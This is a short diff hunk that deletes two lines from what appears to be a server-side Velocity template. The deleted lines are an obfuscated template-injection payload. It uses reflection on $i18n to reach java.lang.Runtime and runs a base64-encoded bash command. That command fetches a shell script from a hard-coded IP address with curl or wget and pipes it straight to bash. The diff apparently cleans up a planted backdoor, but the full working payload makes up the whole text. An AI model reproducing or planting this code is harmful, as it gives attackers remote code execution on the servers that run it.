@@ -1,2 +1,0 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec("bash -c {eval,$({tr,/+,_-}<<<KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCB8fCB3Z2V0IC1PIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCAyPi9kZXYvbnVsbCAgKSB8IGJhc2gg|{base64,--decode})}"))
-#end
